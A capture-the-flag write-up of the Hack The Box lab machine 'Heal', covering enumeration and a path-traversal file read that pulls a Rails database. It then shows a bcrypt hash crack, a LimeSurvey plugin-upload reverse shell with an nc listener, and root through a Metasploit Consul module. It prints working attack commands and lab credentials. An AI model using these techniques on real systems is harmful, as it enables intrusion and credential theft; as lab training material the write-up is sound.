## Enumeration

Let's start with nmap scan:

```nmap -Pn -A -p- 10.10.11.46 -v```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```
The results show two open ports:
- 22/tcp – SSH (OpenSSH 8.9p1)
- 80/tcp – HTTP (nginx 1.18.0)


HTTP redirects us to **heal.htb**, so we add it to /etc/hosts:

Upon visiting **heal.htb**, we’re met with a login page:
![](/assets/blogimages/Writeups/Hackthebox/heal/heal2.png)

We register an account (requires **api.heal.htb** in /etc/hosts), and are redirected to a Resume Builder:
![](/assets/blogimages/Writeups/Hackthebox/heal/heal4.png)
This form lets you generate and export resumes as PDFs.

Visiting **api.heal.htb** confirms the backend is Ruby on Rails.

Exploring the app further, the Survey section redirects to **take-survey.heal.htb**, which runs LimeSurvey.

Tried the admin panel with default creds (admin:password)—no luck.

## Initial Foothold

 I returned to the Resume Builder feature and started exploring its functionality. While exporting a created resume to PDF, I intercepted the requests and noticed something interesting—a file download endpoint:
![](/assets/blogimages/Writeups/Hackthebox/heal/heal7.png)

I tested for a Local File Inclusion (LFI) vulnerability, and it worked!
![](/assets/blogimages/Writeups/Hackthebox/heal/heal8.png)

Since the backend was running Ruby on Rails, I consulted the official [Rails configuration](https://guides.rubyonrails.org/configuring.html) guide to identify key configuration files.
Using the LFI, I fetched the database configuration file `/download?filename=../../config/database.yml`:<br>
![](/assets/blogimages/Writeups/Hackthebox/heal/heal9.png)

I then downloaded the database file directly using wget:
```
wget --header="Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE" "http://api.heal.htb/download?filename=../../storage/development.sqlite3" -O development.sqlite3
```



After running `strings development.sqlite3`, I found a bcrypt hash for the **ralph** user:
![](/assets/blogimages/Writeups/Hackthebox/heal/heal10.png)
`$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG`

I used Hashcat to crack it:
`hashcat -m 3200 -a 0 ralphHASH.txt /usr/share/wordlists/rockyou.txt`
![](/assets/blogimages/Writeups/Hackthebox/heal/heal11.png)
`$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369`



The cracked password was:
`ralph:147258369`
I then logged in to take-survey.heal.htb using those credentials.

Then just scrolling down it reveals that LimeSurvey 6.6.4 version is used.

While exploring the interface, I noticed it was running LimeSurvey version 6.6.4.

I searched for a known exploit using the query limesurvey 6.6.4 exploit and found this [blog post on CVE-2021-44967](https://ine.com/blog/cve-2021-44967-limesurvey-rce). Although the exploit was originally for older versions, I decided to try it anyway.

Using the resource I did the following steps:<br>
**1.** Downloaded files from [github](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE)<br>
**2.** Modified php-rev.php to include my tun0 IP and desired port:
![](/assets/blogimages/Writeups/Hackthebox/heal/heal13.png)

**3.** In config.xml I added version 6.0 compatibilty since otherwise it would give `The plugin is not compatible with your version of LimeSurvey.` error.

```

        <version>6.0</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>
```

**4.** Then zipped it all up: `zip -r Y1LD1R1M.zip config.xml php-rev.php`<br>
**5.** In the LimeSurvey dashboard, I navigated to: Configuration → Plugins → Upload & Install, selected the crafted ZIP file, and clicked Install → Install. After installation, I activated the plugin:<br>

**6.** With the plugin active, I prepared a reverse shell listener on my attacking machine: `nc -lvnp 1234`. 
Then, I triggered the payload by accessing: **take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php** and got a shell:
![](/assets/blogimages/Writeups/Hackthebox/heal/heal15.png)
Used `python3 -c 'import pty; pty.spawn("/bin/bash")'` for a upgraded shell.

While exploring the system, I found credentials in **/var/www/limesurvey/application/config/config.php**:
![](/assets/blogimages/Writeups/Hackthebox/heal/heal16.png)
I tried logging in via SSH with those creds and successfully accessed the machine as user **ron**:
 `ron:AdmiDi0_pA$$w0rd`.

## Privilege Escalation

While exploring the system, I noticed a non-ordinary process running as root by inspecting the process list with `ps aux`:
```
root     1737  0.0  0.1  /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 -data-dir=/var/lib/consul -node=consul-01 -config-dir=/etc/consul.d
```
This indicated that HashiCorp Consul was running locally.
I checked the Consul version via the binary:
![](/assets/blogimages/Writeups/Hackthebox/heal/heal17.png)

After researching potential exploits, I came across a known [Metasploit module](https://www.rapid7.com/db/modules/exploit/multi/misc/consul_service_exec/)

To exploit it, I followed these steps:

1. Port Forward Consul's Web UI (Port 8500) to my local machine:
```
ssh -L 8500:localhost:8500 ron@10.10.11.46
```

2. Launch Metasploit and configure the exploit:
```
msfconsole -q
use exploit/multi/misc/consul_service_exec
set RHOSTS localhost
set LHOST tun0
run
sessions 2
```
After a few moments, I received a session as root:

And just like that — I had root access on the box!
